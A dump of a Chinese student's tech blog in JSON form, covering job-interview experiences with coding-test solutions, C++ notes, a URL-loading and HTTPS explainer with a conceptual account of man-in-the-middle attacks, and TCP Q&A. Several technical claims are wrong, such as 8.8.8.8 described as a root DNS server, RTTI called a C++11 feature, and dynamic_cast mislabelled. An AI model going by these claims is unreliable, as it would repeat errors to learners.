我就继续追问你们团队在什么情况下会考虑或者允许代码重构，然后他又balabala讲一堆 我又问那如果对小范围的代码进行了重构，在测试上会是一个怎么样的流程，然后他黑盒白盒测试讲了一堆 就感觉是我在面试他，所以我就没问了 面试的最后他让我说一下我自己的一个缺点，这简直送命题，就你不能真的说自己的缺点，所以我就说了自己对以后的工作方向比较迷茫，不知道怎么选，他说这不是一个缺点hhhhh，然后又给我疏导了半天，面试就结束了。 总的来说华为的两面都很舒服，感觉都是在聊天，面试官还会给你一些建议，比其他公司还是要好很多的，我感觉是因为其他公司可能工作忙吧，都是抽时间面试；而华为这些人在这两天是专职面试，所以比较放松。 最后华为的面试都过了，等后续录用再来更一次，不过去实习是不可能去实习的，只能来混混面试经验这样子。 快手时间安排 2020/4/18 晚上 人才评测 2020/4/26 下午 笔试 2020/5/11 晚上 查了一下发现直接没了 笔试快手的笔试一共4道题，分值分配为20、20、30、30,总计100分，我个人就看了前两道，第一道过了25%后超时，第二道完全没思路，心态崩了，果断提前交卷走人。 T1 域名归类试题如下图 T1 基本就是字符串识别+匹配 用一个map来把url前缀和路径的set对应起来 路径用set存储即可去重 对于不同的前缀，路径set相同即可归为一类 坑点在于常规操作会超时，进行set对比时最好使用hash，我尝试过把set放进map，但这样需要重载&lt;符号，只能作罢我的代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192#include&lt;iostream&gt;#include &lt;vector&gt;#include &lt;unordered_map&gt;#include &lt;set&gt;using namespace std;bool valid(set&lt;string&gt;&amp; s1, set&lt;string&gt;&amp; s2)&#123; if(s1.size() != s2.size()) return false; auto iter1 = s1.begin(); auto iter2 = s2.begin(); while(iter1 != s1.end())&#123; if(*iter1 != *iter2) return false; iter1++; iter2++; &#125; return true;&#125;int main()&#123; int n; cin &gt;&gt; n; vector&lt;string&gt; urls; unordered_map&lt;string, set&lt;string&gt;&gt; paths; string tempUrl; for(int i = 0; i &lt; n; ++i)&#123; cin &gt;&gt; tempUrl; urls.push_back(tempUrl); &#125; for(int i = 0; i &lt; n; ++i)&#123; int point = 0; for(int j = 7; j &lt; urls[i].size(); ++j)&#123; if(urls[i][j] == '/')&#123; string header = urls[i].substr(0, j); if(paths.find(header)!=paths.end())&#123; set&lt;string&gt; s = paths[header]; s.insert(urls[i].substr(j)); paths[header] = s; &#125; else&#123; set&lt;string&gt; s; s.insert(urls[i].substr(j)); paths[header] = s; &#125; break; &#125; &#125; &#125; int counter = 0; vector&lt;vector&lt;string&gt;&gt; res; vector&lt;bool&gt; used(paths.size(), false); auto iter = paths.begin(); int now = 0; while(iter != paths.end())&#123; while(used[now] &amp;&amp; iter != paths.end())&#123; iter++; now++; &#125; if(iter == paths.end()) break; vector&lt;string&gt; t; auto iter1 = iter; int now1 = now+1; iter1++; while(iter1 != paths.end())&#123; if(!used[now1] &amp;&amp; valid(iter-&gt;second, iter1-&gt;second))&#123; t.push_back(iter1-&gt;first); used[now1] = true; &#125; iter1++; now1++; &#125; if(t.size() &gt; 0)&#123; t.push_back(iter-&gt;first); res.push_back(t); counter++; used[now] = true; &#125; iter++; now++; &#125; cout &lt;&lt; counter &lt;&lt; endl; for(int i = 0; i &lt; res.size(); ++i)&#123; for(int j = 0; j &lt; res[i].size(); ++j) cout &lt;&lt; res[i][j] &lt;&lt; \" \"; cout &lt;&lt; endl; &#125; return 0;&#125; 大佬的代码如下：1234567891011121314151617181920212223242526272829303132333435363738394041424344#include&lt;cstdio&gt;#include&lt;cmath&gt;#include&lt;iostream&gt;#include&lt;hash_fun.h&gt;#include&lt;bits/stdc++.h&gt;using namespace std;size_t ha(set&lt;string&gt; &amp;ss)&#123; size_t res=0x12345; for(auto &amp;i:ss)res=(res+hash&lt;string&gt;()(i))%1000000000; return res;&#125;char *head=\"http://\";int main()&#123; int n,len=strlen(head); scanf(\"%d\",&amp;n); char tmp[500]; vector&lt;string&gt; vs; for(int i=0;i&lt;n;i++)&#123; scanf(\"%s\",tmp); vs.push_back(tmp+len); &#125; unordered_map&lt;string,set&lt;string&gt; &gt; um; for(auto &amp;i:vs)&#123; auto pos=i.find('/'); if(pos==string::npos)&#123; um[i].insert(\"\"); &#125;else um[i.substr(0,pos)].insert(i.substr(pos)); &#125; unordered_map&lt;size_t,set&lt;string&gt; &gt; res; for(auto &amp;i:um)&#123; res[ha(i.second)].insert(i.first); &#125; printf(\"%d\\n\",res.size()); for(auto &amp;i:res)&#123; for(auto &amp;j:i.second)&#123; cout&lt;&lt;head&lt;&lt;j&lt;&lt;' '; &#125; printf(\"\\n\"); &#125; return 0;&#125; T2 辛苦的邮递员试题如下图 T2 这个题我反正是没啥思路，大佬说是LCA问题，咱也不懂，咱就查 在简单看完这篇LCA问题详解后我已经不想学了.jpg 拼多多时间安排 2020/4/30 晚上 性格评测 2020/5/6 下午 笔试 2020/5/9 下午 一面 笔试pdd的笔试难度是适中的，基本是1Easy、2Middle、1Hard，最后写出来2.6道，没截屏，简单记录一下 T1 PDD的盒子一共有N个盒子，每个盒子里有Ni个球，需要往盒子里加球，使得每个盒子里的球数都不一样，求最小的加球数 感觉就不是很难，sort一下然后遍历就可以了 12345678910111213141516171819int main()&#123; long int n, t, i, c; cin &gt;&gt; n; vector&lt;long int&gt; box; for(i = 0; i &lt; n; ++i)&#123; cin &gt;&gt; t; box.push_back(t); &#125; sort(box.begin(), box.end()); c = 0; for(i = 1; i &lt; n; ++i)&#123; if(box[i] &lt;= box[i-1])&#123; c += (box[i-1] - box[i] + 1); box[i] += (box[i-1] - box[i] + 1); &#125; &#125; cout &lt;&lt; c &lt;&lt; endl; return 0;&#125; T2 火柴拼正方形给定一组长度不同的火柴，判断能否拼成一共正方形，与Leetcode T473基本一致 本来写的是贪心，每次取走一个边长的火柴，按长度从长到短取，结果一直过不了，自己又举不出例子 后来改成了DFS，过了60%，但并没有超时，就比较奇怪，同样举不出例子 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152bool dfs(vector&lt;int&gt;&amp; nums,int curLen)&#123; if(curLen==0) return true; for(int i=nums.size()-1; i&gt;=0; --i) &#123; if(nums[i]&gt;curLen) return false; if(nums[i]&gt;0) &#123; int tmp=nums[i]; nums[i]=0; if(dfs(nums,curLen-tmp)) return true; nums[i]=tmp; &#125; &#125; return false;&#125;int main()&#123; int n, i, j, c, t, now, sum, flag; cin &gt;&gt; n; for(i = 0; i &lt; n; ++i)&#123; vector&lt;int&gt; legs; cin &gt;&gt; c; sum = 0; flag = 0; if(c &lt; 4)&#123; cout &lt;&lt; \"NO\" &lt;&lt; endl; continue; &#125; for(j = 0; j &lt; c; ++j)&#123; cin &gt;&gt; t; sum += t; legs.push_back(t); &#125; sort(legs.begin(), legs.end()); now = 4; while(now &gt; 0)&#123; if(sum % now != 0 || !dfs(legs, sum/now))&#123; flag = 1; break; &#125; sum -= (sum/now); now--; &#125; if(flag) cout &lt;&lt; \"NO\" &lt;&lt; endl; else cout &lt;&lt; \"YES\" &lt;&lt; endl; &#125; return 0;&#125; T3 斐波拉契数列变形F(i) = F(i-1) + F(i-2)，输入F(0) = A, F(1) = B,求F(T)是否能被3整除 这题拿到第一想法就是分类讨论 后来发现F(x)%3必定会走上一个循环(01120221) 这个循环里包含了除了00外所有的组合 当AB不同时只是初始位置不同 1234567891011121314151617181920212223242526272829303132333435363738394041int main()&#123; long int n; int a, b, i, t, now; cin &gt;&gt; n; for(i = 0; i &lt; n; ++i)&#123; cin &gt;&gt; a &gt;&gt; b &gt;&gt; t; if(a % 3 == 0 &amp;&amp; b % 3 == 0)&#123; cout &lt;&lt; \"YES\" &lt;&lt; endl; continue; &#125; else if(a % 3 == 0 &amp;&amp; b % 3 == 1)&#123; now = 0; &#125; else if(a % 3 == 0 &amp;&amp; b % 3 == 2)&#123; now = 4; &#125; else if(a % 3 == 1 &amp;&amp; b % 3 == 0)&#123; now = 7; &#125; else if(a % 3 == 1 &amp;&amp; b % 3 == 1)&#123; now = 1; &#125; else if(a % 3 == 1 &amp;&amp; b % 3 == 2)&#123; now = 2; &#125; else if(a % 3 == 2 &amp;&amp; b % 3 == 0)&#123; now = 3; &#125; else if(a % 3 == 2 &amp;&amp; b % 3 == 1)&#123; now = 6; &#125; else if(a % 3 == 2 &amp;&amp; b % 3 == 2)&#123; now = 5; &#125; now = (t + now) % 8; if(now == 0 || now == 4) cout &lt;&lt; \"YES\" &lt;&lt; endl; else cout &lt;&lt; \"NO\" &lt;&lt; endl; &#125; return 0; 一面pdd的处理速度还是很快的，5.6笔试，5.7晚上发通知，5.9就面试了。 一面整体感觉比较友好，上来先是自我介绍，这点要说一下，pdd用的是自己的面试平台，贼严，就连多屏幕跳转都能检测得到，没办法只能硬上了，基本情况说了一下之后着重问了一下网安项目，然后问常用的编程语言，问了操作系统的一些基础问题，最后写了两道easy的编程题，问我有没有什么问题就结束了，总共不到40min时间。 面试问题 内存泄漏的原因、检测方法、处理方法 一个线程有几个堆几个栈、为什么不大家共用堆栈 堆与栈的区别 操作系统为什么分用户态和内核态 用户态是怎么切换到内核态的(主动和被动) 面试编程题T1 数组去重 给定一个数组，去掉与相邻元素重复的元素，返回剩余的元素个数X，并在数组尾部补全原数组的最后X个元素 最后被问能否不开辟空间，我给的答复是可以，但是时间复杂度就会O(n) 123456789101112131415161718//给的是指针就用C写了int t1(int* data, int l)&#123; if(l == 0) return 0; int* temp = (int*)malloc(l*sizeof(int)); memset(temp, 0, l*sizeof(int)); int count = 1; temp[0] = data[0]; for(int i = 1; i &lt; l; ++i)&#123; if(data[i] != data[i-1])&#123; temp[count] = data[i]; count++; &#125; &#125; for(int i = 0; i &lt; count; ++i)&#123; data[i] = temp[i]; &#125; return count;&#125; T2 寻找key-value 给定一个数组，存储着key-value。并且key是有序的，存储方式为k1,v1,k2,v2…，给定一个key，返回其value，不存在则返回-1 基本就是自己实现map，我采用的是二分法 1234567891011121314151617181920int t2(vector&lt;int&gt;&amp; kvs, int key)&#123; if(kvs.size() == 0) return -1; int len = kvs.size(); int l = 0, r = len-1, mid; while(l &lt; r)&#123; //当时写代码时没有考虑到mid的奇偶问题，感觉对mid的处理还是有点问题 //应该初始化r=len-2,然后if(mid%2 != 0) mid+=1; mid = l + (r-l)/2; if(kvs[mid] == key)&#123; return kvs[mid+1]; &#125; else if(kvs[mid] &gt; key)&#123; r -= 2; &#125; else&#123; l += 2; &#125; &#125; return -1;&#125; 标准结局 又到了给面试官提问的环节了 Q1：公司加班多吗，还是分部门(一般公司会这么说) A1：承认整体加班都多，但反手表示各公司都加班，但pdd给加班费多 Q2：公司技术氛围如何？开会多吗？有技术分享吗？ A2：技术氛围还ok吧，开会不多，分享偶然有，但不要抱太大期望 Q3：对我的评价 A3：整体还挺好的，但就是做的东西比较杂，而且网络安全这个方向emmmm 有一说一，pdd的员工真的就异常真实了，愿意承认加班多，技术氛围一般，就是钱多，也愿意对我做出最真实的评价，不像某里说不错反手给挂了，也不像某讯，表示不方便透露。","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"C++相关知识点梳理","slug":"C++相关知识点梳理","date":"2020-06-24T08:03:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/06/24/C++相关知识点梳理/","link":"","permalink":"https://liuyi12138.github.io/2020/06/24/C++相关知识点梳理/","excerpt":"整理一下与C++相关的一些常考知识点。","text":"整理一下与C++相关的一些常考知识点。 关键字static隐藏未加static的全局变量和函数是全局可见的，当同时编译多个文件时，文件之间的变量或者函数可能会有命名冲突的情况，可以使用static来隐藏，使得变量或函数只能在该文件可见。 改变变量的存储方式和生命周期static关键字会使得它修饰的变量存储在静态存储区，在程序开始运行是就初始化，并且会一直存在直到程序结束，并且不会被再次初始化。 对类成员声明static同样有上述的几种功能，对该成员函数or静态变量进行隐藏以及改变其生命周期，并且所有的对象共用一个静态成员函数或静态变量。另外静态内部类也是实现单例模式的一种方法，其优点在于外部类加载时并不需要立即加载内部类，内部类不被加载则不去初始化INSTANCE，故而不占内存，只有当getInstance()方法第一次被调用时，才会去初始化INSTANCE。 constconst用来表示常量，即不允许他修饰的变量被修改，在进行参数传递的时候，也常常使用const修饰引用来传参，既保证了不复制参数，又防止对象被修改。C++中还可以用const修饰成员函数和数据成员来达到封装的目的，不允许使用const修饰的成员函数来修改数据成员。 extern Cextern是C/C++语言中表明函数和全局变量作用范围（可见性）的关键字，该关键字告诉编译器，其声明的函数和变量可以在本模块或其它模块中使用(只是声明，不分配内存) 与extern对应的关键字是static，被它修饰的全局变量和函数只能在本模块中使用。因此，一个函数或变量只可能被本模块使用时，其不可能被extern “C”修饰。 被extern “C”修饰的变量和函数是按照C语言方式编译和链接的 之所以要如此是因为编译器在将C++源代码编译成目标文件时，会将函数和变量的名称进行修饰，形成符号名，目标文件中所使用的符号名就是修饰后名称，所以对于不同函数签名的函数，即使函数名相同，编译器和链接器都认为它们是不同的函数（重载）。因此有时候在调用一些库函数的时候，会出现无法链接的情况(因为函数签名不同)所以对于C++来说，必须使用extern “C”来声明这些函数。 底层原理RTTIRTTI是运行时类型检测，也是C++11的新特性，主要是在dynamic_cast、typeid中使用，在进行类型转换前或者获取类型时，会查询type_info指针来进行类型检测。 cast转换 const_cast，用于将const变量转换为非const static_cast，用于隐式转换，如非const转const，void*转指针等，能用于多态向上转化，向下不安全 static_cast，动态类型转换，可以用于层次间的向上向下转化，只能转指针和引用 reinterpret_cast，什么都可以转，可能会出问题 虚函数（多态）多态及其实现条件c++中的多态就是在父类的函数前加上virtual关键字，在子类中重写该函数，运行时将会根据对象的实际类型来调用相应的函数，如果对象类型是子类，就调用子类的函数，如果对象类型是父类，就调用父类的函数。 多态的实现需要两个条件： 虚函数重写，设置不同的状态 对象调用虚函数时必须是指针或者引用 虚函数与重写 虚函数是带有virtual关键字的成员函数 子类有个和父类完全相同(函数名,形参,返回值都相同,协变和析构函数除外)的虚函数,就称子类虚函数重写父类虚函数 多态的原理 多态是用虚函数表来实现的 有虚函数的类都会生成一个虚函数表，在编译的时候使用 虚函数表是一个存储虚函数地址的数组 生成子类的虚函数表需要经过一下步骤 将父类的虚函数表拷贝 将子类中重写的虚函数覆盖掉父类中的虚函数 如果有新增加的虚函数则放到表的最后 在调用时会根据对象中的虚表指针来找实际应该调用的函数 其他问题 虚函数和普通函数一样在代码段,虚表在只读常量区 inline函数(内联函数)没有地址,无法放到虚函数表中 静态成员不能是虚函数，因为静态成员函数没有this指针,因为有this指针才能访问到虚表指针,有虚表指针才能找到虚表从而调用实际应该调用的函数 构造函数不能是虚函数，因为对象中的虚函数表指针是在构造函数初始化列表阶段才初始化的 析构函数可以是虚函数，并且最好把基类的析构函数定义成虚函数，当父类指针指向子类对象时,如果析构函数不是虚函数,析构就只会释放父类对象,造成内存泄漏 普通对象访问普通函数和访问虚函数是一样快的(不会触发多态);指针对象或者是引用对象，调用普通函数更快一些，因为构成了多态，运行时调用虚函数要先到虚函数表中去查找。这样然后才拿到韩式的地址，这样就不如直接可以拿到函数地址的普通函数快。 内存管理与内存泄露可以通过静态扫描来检测内存泄露，具体的操作为对象计数；重载new/delete，记录分配点等 解决内存泄露可以使用智能指针，但要小心循环引用的问题。 C++11autoauto实际上很早就被引入到C++，用来进行类型推导，比如用在迭代器中。 nullptr传统的C++无法区分NULL和0，有的编译器会把NULL定义为void*的指针，有的直接就定义为0了，这就会导致一系列的问题，比如在重载时会发生混乱，所以C++11引入了nullptr来区分空指针和0。 基于范围的for循环进行遍历的时候可以像python一样写auto iter:arr来遍历。 初始化列表提供了统一的语法来初始化任意的对象,这两个特性就让人感觉C++越来越智能而简洁了。 智能指针C++11引入智能指针主要是因为C++没有自动的内存回收机制，所以当业务逻辑过于复杂的时候难免会出现内存没有delete的现象，这就容易造成内存泄漏的问题，智能指针主要就是被用来对这些资源进行动态管理，并及时释放无用的资源。 C++11提供四种智能指针，有unique_ptr,shared_ptr, weak_ptr,以及auto_ptr，不过auto_ptr已经被弃用。 shared_ptr允许多个指针指向相同的对象，每次被引用就内部计数+1，析构则-1，当引用计数为0时则释放内存。unique_ptr只允许一个指针指向给定的对象，weak_ptr最大的作用在于协助shared_ptr，可以观测目标对象的引用计数。 智能指针会遇到的最大问题是循环引用，就像是类之间的循环引用一样，两个指针互相引用对方就会造成都无法析构的现象。循环引用的现象可以通过让引用链上的一方持用普通指针或弱智能指针(weak_ptr)来解决。 实现智能指针可以通过引入辅助类或者使用句柄。辅助类实现即单独使用一个类来存储引用计数，每次在构造和析构智能指针类的时候对辅助类进行操作。而句柄实现则是把指针封装起来，通过重载来重新定义指针的行为，将计数内置进去。 右值引用C++11引入右值引用的目的是解决拷贝临时对象时的性能低下问题，在C++11之前，进行临时对象拷贝时会多调用一次构造函数并复制，这就使得性能低下。实际上直接移动变量的指向就会快得多，但C++11之前右值是不能被取地址的，所以没法进行右值引用。 从本质上来说，左值引实际上是用const指针来实现的，它保存的是一个指向数据地址的指针，而如果进行反汇编可以发现右值引用是通过取地址来实现的，一个变量的右值引用存储的就是它的地址。 而对于传入的引用，在不知道是左值还是右值的情况下，可以用move函数来将其转换为右值，也就是实现了取地址的操作。 新增STL容器array以及tuple(元组)array保存在栈内存中，相比堆内存中的vector，速度更快，但array长度无法更改，没有vector灵活。 而新增了tuple感觉就是C++在像python看齐","categories":[{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/categories/面经/"}],"tags":[{"name":"C++","slug":"C","permalink":"https://liuyi12138.github.io/tags/C/"},{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"网址访问过程详解","slug":"网址访问过程详解","date":"2020-05-25T13:06:36.000Z","updated":"2021-02-23T06:34:31.925Z","comments":true,"path":"2020/05/25/网址访问过程详解/","link":"","permalink":"https://liuyi12138.github.io/2020/05/25/网址访问过程详解/","excerpt":"在面试过程中常常会遇到这样一个问题：请你详细描述一下从我们在浏览器中输入网址到最后看到网页，这个过程中发生了什么？这个问题涉及面十分广，几乎涵盖了计网的全部相关问题，这个题的答案因人而异，可以挑选一两个着重点进行详细说明，其他的略过。","text":"在面试过程中常常会遇到这样一个问题：请你详细描述一下从我们在浏览器中输入网址到最后看到网页，这个过程中发生了什么？这个问题涉及面十分广，几乎涵盖了计网的全部相关问题，这个题的答案因人而异，可以挑选一两个着重点进行详细说明，其他的略过。 全过程简要概述当我们将网址输入到浏览器后，第一件事就是解析url得到域名，通过DNS协议获取到该域名的ip地址，得到ip后浏览器会先与服务器通过TCP三次握手建立连接，然后构建HTTP请求，将HTTP的传输工作交给操作系统的协议栈，发送请求成功后，浏览器会从服务端拿到该页面的HTML以及资源文件，浏览器会渲染页面，呈现出我们所看到的模样。 在这整个过程中，涉及到了DNS解析，http请求，TCP\\IP协议栈、页面渲染等知识，当然也可以继续扩展，比如从HTTP可以说到HTTPS，可以说到对称加密与非对称加密，可以说到网络安全等等，主要目的就是让整个面试过程跟着你的技术栈走，而不被面试官带到你不会的地方。 在这里我将重点写一下我在面试中喜欢拓展的方向，并拟出一份答案。 DNS解析浏览器在拿到url时，首先会对url进行解析，将域名与实际的文件路径分离，然后需要使用DNS协议，通过域名得到IP地址。 首先浏览器会查询浏览器缓存，如果有这个网址就可以直接获取到IP，如果没有就进一步访问本机缓存，如果本机缓存也没有才会发起DNS请求。 而DNS的服务器是一个树状结构，对于域名来说是倒着进行解析的，根节点是根DNS服务器，他的子节点为com、cn这种顶级域dns服务器，然后进一步向下进行解析。 以baidu.com为例，当我们的电脑需要发起DNS请求的时候，会先对根DNS服务器发起请求，这个服务器的IP地址一般在每台电脑上都有，我们一般会设置为8.8.8.8或者114.114.114.114，我们的电脑在访问根DNS服务器后，会得到con域DNS服务器的IP，然后会继续访问con域DNS服务器，这时就能得到baicu.com的IP地址了。 HTTP请求在解析url时，我们能获取到需要请求资源的资源路径、端口号、请求参数等信息，这些信息会被存储在http头中，通过DNS请求获取到ip后，浏览器会构建并发送HTTP请求或者HTTPS请求，HTTPS就是在HTTP的基础上加了一个TLS协议来进行数据加密，这个我们待会说。 HTTP请求有很多种，但对资源的操作离不开增删改查，也就对应着POST、DELETE、PUT、GET请求。最常用的是GET和POST，其区别在于GET的参数是在url中的，而POST的参数是在请求的body中。 以GET为例，当需要发送HTTP请求的时候，同样也不是直接就发送了，需要先查询浏览器缓存。浏览器中的缓存分为强缓存和协商缓存，浏览器发起HTTP请求时首先会根据http头信息来判断是存有强缓存，以及其是否过期，如果有强缓存且未过期则命中，不会发送请求到服务器了。如果强缓存没命中，则会向服务器发起请求，这个请求的Header头中会带有浏览器最后一次请求该资源的时间和一个资源校验码(使用资源修改时间、资源大小等信息生成)，服务器收到这个请求后会判断协商缓存是否过期，如果过期则返回新的资源信息，如果没过期则返回304状态码，表示资源未更新，可以使用缓存中的资源。 TCP-&gt;网络层连接TCP这一块内容比较多，所以一般不会在这个问题中详细说明，这里只写一个过渡段，想要了解TCP相关问题解答的可以看我的另一篇博客：TCP详解 HTTP请求发出后会将数据包交给下层协议栈处理，在传输层和网络层该数据包会被分别加上TCP头和IP头，并且被发送出去，沿路的网关会收到这个数据包并进行识别和转发，直到该数据包被服务器收到，通过相同的流程返回回复数据包。 页面渲染由于我对前端不熟悉，就不展开讲，被问到的话就说是通过写爬虫来了解DOM树的(挪威组)，前端只会简单的Vue开发，底层原理不了解 一般来说，浏览器第一次从服务器请求的资源都是一个HTML文件，例如服务端默认的index.html等，浏览器获取到这个HTML文件就会对其进行解析，构建出一棵DOM树，并通过执行其中的js代码发起更多的请求，请求渲染页面需要的其他资源，CSS或者一些外链的图片等，拿到CSS后将其与DOM树结合进行更进一步的渲染，我们就能看到页面了。 HTTPS由于HTTP是使用信息明文传播，所以会有窃听、篡改、冒充等风险，所以HTTPS在HTTP的基础上加上了SSL层，通过加密的方式来保证数据安全。 SSL通过加密防止窃听，通过签名来防止篡改，通过证书来防止冒充。HTTPS协议在客户端与服务端开始通信前，会进行密钥协商，通过一轮非对称加密，一般是RSA加密来传递后序通信过程使用的对称密钥，由于非对称加密较慢，后续通信过程中使用对称加密。在密钥协商的过程中，服务端会将自己的证书发送给客户端，客户端会到CA机构通过摘要值验证证书的合法性，从而防止中间人攻击。 补充提问：你对中间人攻击有哪些了解？中间人攻击主要分为SSL劫持攻击、SSL剥离攻击以及针对SSL算法的攻击 SSL劫持攻击即SSL证书欺骗攻击，攻击者为了获得HTTPS传输的明文数据，需要先将自己接入到客户端和目标网站之间；在传输过程中伪造服务器的证书，将服务器的公钥替换成自己的公钥，这样中间人就可以解密客户端和服务端的数据传输内容。可以通过在网站前端加入证书校验来预防SSL劫持攻击。 SSL剥离攻击，即将HTTPS连接降级到HTTP连接。假如客户端直接访问HTTPS的URL，攻击者是没办法直接进行降级的，该攻击方式主要是利用用户并不会每次都直接在浏览器上输入https来访问网站或者有些网站并非全网HTTPS，中间人攻击者在劫持了客户端与服务端的HTTP会话后，将HTTP页面里面所有的 https:// 超链接都换成 http:// ，用户在点击相应的链接时，是使用HTTP协议来进行访问。可以通过在网站前端检查URL是否被篡改来预防SSL剥离攻击。 针对SSL算法的攻击：低版本的SSL协议是存在漏洞的，这些漏洞可能会被公共者利用，及时升级服务端的SSL配置可以预防针对SSL算法的攻击。 最终答案浏览器在拿到url时，首先会对url进行解析，将域名与实际的文件路径分离，然后需要使用DNS协议，通过域名得到IP地址。浏览器会查询浏览器缓存，如果有这个网址的缓存就可以直接获取到IP，如果没有就进一步访问本机缓存，如果本机缓存也没有才会发起DNS请求。而DNS的服务器是一个树状结构，对于域名来说是倒着进行解析的，根节点是根DNS服务器，他的子节点为com、cn这种顶级域dns服务器，然后进一步向下进行解析。以baidu.com为例，当我们的电脑需要发起DNS请求的时候，会先对根DNS服务器发起请求，这个服务器的IP地址一般在每台电脑上都有，我们一般会设置为8.8.8.8或者114.114.114.114，我们的电脑在访问根DNS服务器后，会得到con域DNS服务器的IP，然后会继续访问con域DNS服务器，这时就能得到baicu.com的IP地址了。 得到ip后浏览器会先与服务器通过TCP三次握手建立连接，然后构建HTTP请求。在解析url时，我们能获取到需要请求资源的资源路径、端口号、请求参数等信息，这些信息会被存储在http头中，通过DNS请求获取到ip后，浏览器会构建并发送HTTP请求或者HTTPS请求，HTTPS就是在HTTP的基础上加了一个TLS协议来进行数据加密，这个我们待会说。HTTP请求有很多种，但对资源的操作离不开增删改查，也就对应着POST、DELETE、PUT、GET请求。最常用的是GET和POST，其区别在于GET的参数是在url中的，而POST的参数是在请求的body中。以GET为例，当需要发送HTTP请求的时候，同样也不是直接就发送了，需要先查询浏览器缓存。浏览器中的缓存分为强缓存和协商缓存，浏览器发起HTTP请求时首先会根据http头信息来判断是存有强缓存，以及其是否过期，如果有强缓存且未过期则命中，不会发送请求到服务器了。如果强缓存没命中，则会向服务器发起请求，这个请求的Header头中会带有浏览器最后一次请求该资源的时间和一个资源校验码(使用资源修改时间、资源大小等信息生成)，服务器收到这个请求后会判断协商缓存是否过期，如果过期则返回新的资源信息，如果没过期则返回304状态码，表示资源未更新，可以使用缓存中的资源。 HTTP请求发出后会将数据包交给下层协议栈处理，在传输层和网络层该数据包会被分别加上TCP头和IP头，并且被发送出去，沿路的网关会收到这个数据包并进行识别和转发，直到该数据包被服务器收到，通过相同的流程返回回复数据包。 一般来说，浏览器第一次从服务器请求的资源都是一个HTML文件，例如服务端默认的index.html等，浏览器获取到这个HTML文件就会对其进行解析，构建出一棵DOM树，并通过执行其中的js代码发起更多的请求，请求渲染页面需要的其他资源，CSS或者一些外链的图片等，拿到CSS后将其与DOM树结合进行更进一步的渲染，我们就能看到页面了。 最后再补充一下HTTPS，由于HTTP是使用信息明文传播，所以会有窃听、篡改、冒充等风险，所以HTTPS在HTTP的基础上加上了SSL层，通过加密的方式来保证数据安全。SSL通过加密防止窃听，通过签名来防止篡改，通过证书来防止冒充。HTTPS协议在客户端与服务端开始通信前，会进行密钥协商，通过一轮非对称加密，一般是RSA加密来传递后序通信过程使用的对称密钥，由于非对称加密较慢，后续通信过程中使用对称加密。在密钥协商的过程中，服务端会将自己的证书发送给客户端，客户端会到CA机构通过摘要值验证证书的合法性，从而防止中间人攻击。 参考资料 C++工程师面试宝典之计算机网络 在浏览器中输入一个URL会发生什么? 在浏览器中输入URL并回车后都发生了什么？ 探究：一个数据包在网络中到底是怎么游走的？ HTTP协议超级详解 HTTP缓存机制 SSL/TLS协议运行机制的概述 HTTPS的数字证书验证原理 MITM攻击(中间人攻击)","categories":[{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/categories/计网/"}],"tags":[{"name":"计网","slug":"计网","permalink":"https://liuyi12138.github.io/tags/计网/"},{"name":"面经","slug":"面经","permalink":"https://liuyi12138.github.io/tags/面经/"}]},{"title":"TCP详解","slug":"TCP详解","date":"2020-05-24T07:51:36.000Z","updated":"2021-02-23T06:34:31.910Z","comments":true,"path":"2020/05/24/TCP详解/","link":"","permalink":"https://liuyi12138.github.io/2020/05/24/TCP详解/","excerpt":"在面试中但凡问到计网，肯定会问TCP相关的问题，而很多细节总是遗忘，所以需要专门以问答的方式写一篇博客来记载一下。","text":"在面试中但凡问到计网，肯定会问TCP相关的问题，而很多细节总是遗忘，所以需要专门以问答的方式写一篇博客来记载一下。 TCP三次握手的目的是什么？为什么不用两次和四次？TCP三次握手的主要目的是防止失效的连接请求报文被服务端接受 如果只有两次握手，假设当客户端发送第一次连接请求由于网络拥塞的原因，迟迟未到服务端，客户端没接收到确认报文，认为服务端没有收到，于是重新发送请求报文并与服务端建立连接，等这次连接断开了，之前滞留的那个请求报文又到达了服务端，就会让服务端与客户端再次连接成功，这时服务端就会一直等待客户端发送请求，造成了资源的浪费。 两次握手只能保证单向链路是可以通信的，理论上来说，要保证双向链路可以通信需要四次握手，但实际上服务端给客户端的SYN和ACK数据包可以合为一次握手，所以实际上只需要三次握手即可。 加问：那挥手为什么需要四次呢？三次不行吗？ 答：挥手阶段中服务端的ACK和FIN数据包不能合为一次。因为挥手阶段的流程为客户端发送FIN数据包表示自己发完了，服务端立即回复ACK数据包表示自己知道了，此时客户端到服务端的连接已经释放了，客户端不会再发送数据了，但服务端还可以继续向客户端发送数据，等到服务端也完成了数据发送，才会发送FIN，这时客户端回复ACK，就可以结束通信了。 加问：TCP在四次挥手的过程中为什么客户端最后还要等待2MSL(Maximum Segment Lifetime)？ 答：因为客户端要保证他的ACK包顺利到达服务端，如果客户端的ACK数据包丢失，则服务端或重新发送FIN包到客户端，而这两个过程的最长时间为1MSL，加起来为2MSL，如果2MSL后客户端还没有收到服务端重发的FIN包，则说明ACK包顺利到达，可以关闭连接了。 TCP在握手阶段怎么管理客户端的连接？TCP在握手阶段服务端维护了两个队列：半连接队列和全连接队列 在客户端发起第一次握手时，服务端会把此请求放入半连接队列，并回复SYN+ACK 在客户端回复ACK，也就是第三次握手时，服务端将此连接加入到全连接队列 如果全连接队列满，则服务端的处理方式和tcp_abort_on_overflow参数的设置有关，如果该参数为0，则丢弃该ACK，如果为1则发送RST到客户端，直接放弃此次连接。 此条是我在了解DDOS时发现的，并非常考点，SYN Flood攻击时会造成服务端的半连接队列被占满，从而影响到服务。 TCP通过哪些方式来保证数据的可靠性？TCP保证数据可靠性的方式大致可以分为三类： 在数据包层面：校验和 在数据包传输层面：序列号、确认应答、超时重传 在流量控制层面：拥塞控制 校验和计算方式：在数据传输的过程中，将发送的数据段都当做一个16位的整数。将这些整数加起来。并且加上进位，最后取反，得到校验和。TCP与UDP校验方式相同 